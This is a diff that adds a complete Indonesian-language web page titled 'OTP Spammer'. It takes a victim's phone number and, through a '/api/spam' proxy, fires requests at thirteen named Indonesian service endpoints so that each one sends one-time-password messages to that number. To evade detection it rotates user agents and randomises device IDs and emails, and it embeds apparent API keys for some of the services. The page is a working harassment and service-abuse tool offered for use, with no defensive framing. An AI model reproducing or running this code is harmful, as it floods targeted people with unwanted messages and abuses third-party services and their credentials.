@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Spam Web</title>
+    <style>
+        * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+        body { background: #0d1117; color: #e6edf3; padding: 20px; max-width: 600px; margin: auto; }
+        .card { background: #161b22; border-radius: 16px; padding: 24px; border: 1px solid #30363d; }
+        h1 { font-size: 24px; margin-top: 0; color: #f0883e; display: flex; align-items: center; gap: 10px; }
+        label { display: block; margin: 16px 0 8px; font-weight: 600; }
+        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #e6edf3; font-size: 16px; }
+        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
+        button { flex: 1; padding: 14px; font-weight: 700; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.2s; }
+        #btnStart { background: #f0883e; color: #0d1117; }
+        #btnStart:disabled { opacity: 0.5; cursor: not-allowed; }
+        #btnStop { background: #f85149; color: #fff; display: none; }
+        #log { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 12px; max-height: 400px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; margin-top: 16px; font-family: monospace; }
+        .status { display: flex; justify-content: space-between; margin-top: 12px; font-size: 14px; }
+        .success { color: #3fb950; }
+        .failed { color: #f85149; }
+        .progress { width: 100%; height: 6px; background: #30363d; border-radius: 4px; margin-top: 12px; }
+        .progress-bar { height: 100%; background: #f0883e; border-radius: 4px; width: 0%; transition: width 0.3s; }
+        .badge { font-size: 12px; background: #21262d; padding: 2px 10px; border-radius: 12px; color: #8b949e; }
+        .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #8b949e; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>📱 OTP Spammer <span class="badge">Proxy Vercel</span></h1>
+    <p style="color: #8b949e; margin-bottom: 8px;">Semua request via server proxy — bypass CORS & IP stabil.</p>
+
+    <label for="phone">Nomor HP (08xxx atau 62xxx)</label>
+    <input type="text" id="phone" placeholder="08123456789" value="08123456789">
+
+    <label for="concurrent">Konkuren (request serentak)</label>
+    <select id="concurrent">
+        <option value="1">1 (default)</option>
+        <option value="2">2</option>
+        <option value="3">3</option>
+        <option value="5">5</option>
+    </select>
+
+    <div class="btn-group">
+        <button id="btnStart">🚀 Mulai Spam</button>
+        <button id="btnStop">⏹ Stop</button>
+    </div>
+
+    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+    <div class="status">
+        <span id="statusText">Siap</span>
+        <span><span class="success" id="successCount">0</span> ✅ | <span class="failed" id="failedCount">0</span> ❌</span>
+    </div>
+    <div id="log">📋 Log akan muncul di sini...</div>
+    <div class="footer">Powered by Vercel Serverless Functions</div>
+</div>
+
+<script>
+// ========== KONFIGURASI ==========
+const USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
+];
+
+function randomUA() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
+function randomUUID() { return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { const r = Math.random()*16|0; return (c==='x'?r:(r&0x3|0x8)).toString(16); }); }
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function normalizePhone(phone) {
+    let p = phone.replace(/[^0-9]/g, '');
+    if (p.startsWith('0')) p = '62' + p.slice(1);
+    if (!p.startsWith('62')) p = '62' + p;
+    return p;
+}
+
+// ========== DAFTAR ENDPOINT ==========
+function getEndpoints(phone) {
+    const p08 = '0' + phone.slice(2);
+    const p62 = phone;
+    const pNoCountry = phone.replace('62', '');
+    const email = `user${Math.floor(Math.random()*9999)}@bwmyga.com`;
+
+    return [
+        { url: 'https://api.maulagi.id/api/v2/auth/check', data: { credentials: p62 }, headers: { 'X-ML-KEY': 'B10JLPEP10' } },
+        { url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation', data: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' } },
+        { url: 'https://www.bonusbelanja.com/api/auth/registration/app', data: { phone: p62, name: 'User', agreeTnc: true, agreeContact: false } },
+        { url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: randomUUID() }, request_via: 'whatsapp' } },
+        { url: 'https://www.beautyhaul.com/ajax/account/send_otp', data: { method: 'WhatsApp', phone: p62 } },
+        { url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id', data: { nama_lengkap: 'User', telepon: p08, email: `user${Math.floor(Math.random()*9999)}@mail.com` }, headers: { 'Xid': String(Math.floor(Math.random()*9999999)), 'source': 'ocistok' } },
+        { url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { 'x-api-key': '280999!FTTH' } },
+        { url: 'https://api.dokterin.id/user/v1/users/login', data: { phone: p62, tnc_accept: true, device_id: randomUUID() } },
+        { url: 'https://api.paper.id/api/v1/auth/login', data: { method: 'whatsapp', phone: p08 }, headers: { 'x-paper-user-agent': 'Jupiter/7.19.5', 'request-id': randomUUID() } },
+        { url: 'https://api.indodax.com/api/v1/otp/send', data: { email: email, flow: 'register', method: 'whatsapp', old_uuid: '' }, headers: { 'key': 'bAGUG2WiLy', 'authorization': 'Bearer bAGUG2WiLy' } },
+        { url: 'https://cms.bunda.co.id/api/v1/auth/send-otp', data: { phone_number: p62, type: 'auth' }, headers: { 'X-Locale': 'id' } },
+        { url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode', data: { phone_number: p08 } },
+        { url: 'https://saturdays.com/api/v1/auth/otp', data: { phone: p62, type: 'register' } }
+    ];
+}
+
+// ========== KIRIM REQUEST VIA PROXY ==========
+async function sendRequestViaProxy(endpoint, idx) {
+    try {
+        const resp = await fetch('/api/spam', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                url: endpoint.url,
+                data: endpoint.data,
+                headers: endpoint.headers || {}
+            })
+        });
+        const result = await resp.json();
+        return result.success === true;
+    } catch (e) {
+        return false;
+    }
+}
+
+// ========== UI LOGIC ==========
+const logEl = document.getElementById('log');
+const statusText = document.getElementById('statusText');
+const successCount = document.getElementById('successCount');
+const failedCount = document.getElementById('failedCount');
+const progressBar = document.getElementById('progressBar');
+const btnStart = document.getElementById('btnStart');
+const btnStop = document.getElementById('btnStop');
+
+let running = false;
+
+function addLog(msg) {
+    const time = new Date().toLocaleTimeString();
+    logEl.textContent += `[${time}] ${msg}\n`;
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+async function main() {
+    const phoneInput = document.getElementById('phone').value.trim();
+    if (!phoneInput) { addLog('❌ Masukkan nomor HP!'); return; }
+    const phone = normalizePhone(phoneInput);
+    if (!phone.startsWith('62') || phone.length < 10) { addLog('❌ Format nomor salah (gunakan 08xxx atau 62xxx)'); return; }
+
+    const concurrent = parseInt(document.getElementById('concurrent').value);
+    const endpoints = getEndpoints(phone);
+    let success = 0, failed = 0;
+    let index = 0;
+
+    running = true;
+    btnStart.disabled = true;
+    btnStart.style.display = 'none';
+    btnStop.style.display = 'block';
+    logEl.textContent = '';
+    successCount.textContent = '0';
+    failedCount.textContent = '0';
+    progressBar.style.width = '0%';
+    statusText.textContent = '🔄 Berjalan...';
+
+    addLog(`🎯 Target: ${phone}`);
+    addLog(`📡 Total endpoints: ${endpoints.length}`);
+    addLog(`⚡ Konkuren: ${concurrent} (via proxy Vercel)`);
+
+    const worker = async () => {
+        while (running && index < endpoints.length) {
+            const idx = index++;
+            const endpoint = endpoints[idx];
+            if (!endpoint) break;
+
+            const result = await sendRequestViaProxy(endpoint, idx);
+            const hostname = new URL(endpoint.url).hostname;
+            if (result) { success++; addLog(`✅ ${hostname}`); }
+            else { failed++; addLog(`❌ ${hostname}`); }
+
+            successCount.textContent = success;
+            failedCount.textContent = failed;
+            progressBar.style.width = `${((success + failed) / endpoints.length * 100)}%`;
+
+            await sleep(2000 + Math.random() * 3000);
+        }
+    };
+
+    const workers = [];
+    for (let i = 0; i < concurrent; i++) {
+        workers.push(worker());
+    }
+    await Promise.all(workers);
+
+    running = false;
+    statusText.textContent = '✅ Selesai!';
+    btnStart.disabled = false;
+    btnStart.style.display = 'block';
+    btnStop.style.display = 'none';
+    addLog(`📊 Selesai. Berhasil: ${success}, Gagal: ${failed}`);
+}
+
+btnStart.addEventListener('click', main);
+btnStop.addEventListener('click', () => {
+    running = false;
+    statusText.textContent = '⏹ Dihentikan';
+    btnStart.disabled = false;
+    btnStart.style.display = 'block';
+    btnStop.style.display = 'none';
+    addLog('⏹ Proses dihentikan oleh user.');
+});
+</script>
+</body>
+</html>
